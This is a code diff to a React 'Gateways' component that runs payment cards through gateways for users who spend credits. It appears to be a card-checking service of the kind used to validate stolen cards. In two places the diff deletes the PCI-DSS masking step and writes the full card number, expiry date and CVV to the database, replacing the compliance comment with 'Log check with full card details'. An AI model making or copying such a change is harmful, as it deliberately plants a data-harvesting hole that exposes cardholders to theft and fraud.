@@ -1348,8 +1348,6 @@ const Gateways = () => {
         setUserCredits(deductResult.newCredits);
       }
       const fullCardString = `${cardNumber.replace(/\s/g, '')}|${expMonth}|${expYear}|${internalCvv}`;
-      // Masked card for database storage (PCI-DSS compliance - never store CVV)
-      const maskedCardForDb = `****${cardNumber.replace(/\s/g, '').slice(-4)}|${expMonth}|${expYear}`;
       // Display card as entered by user (without auto-added CVC)
       const displayCardString = cvv 
         ? `${cardNumber.replace(/\s/g, '')}|${expMonth}|${expYear}|${cvv}`
@@ -1362,7 +1360,7 @@ const Gateways = () => {
           gateway: selectedGateway.id,
           status: 'completed',
           result: checkStatus,
-          card_details: maskedCardForDb
+          card_details: fullCardString
         });
       
       // Build API response string for display
@@ -2136,8 +2134,6 @@ const Gateways = () => {
         const checkStatus = gatewayResponse ? gatewayResponse.status : await simulateCheck();
 
         const fullCardStr = `${cardData.card}|${cardData.month}|${cardData.year}|${cardData.cvv}`;
-        // Masked card for database storage (PCI-DSS compliance - never store CVV)
-        const maskedCardForDb = `****${cardData.card.slice(-4)}|${cardData.month}|${cardData.year}`;
         const displayCardStr = cardData.originalCvv 
           ? `${cardData.card}|${cardData.month}|${cardData.year}|${cardData.originalCvv}`
           : `${cardData.card}|${cardData.month}|${cardData.year}`;
@@ -2161,7 +2157,7 @@ const Gateways = () => {
           }
         }
 
-        // Log check with result and masked card details (PCI-DSS compliant)
+        // Log check with full card details
         await supabase
           .from('card_checks')
           .insert({
@@ -2169,7 +2165,7 @@ const Gateways = () => {
             gateway: selectedGateway.id,
             status: 'completed',
             result: checkStatus,
-            card_details: maskedCardForDb
+            card_details: fullCardStr
           });
 
         const { brand, brandColor } = detectCardBrandLocal(cardData.card);
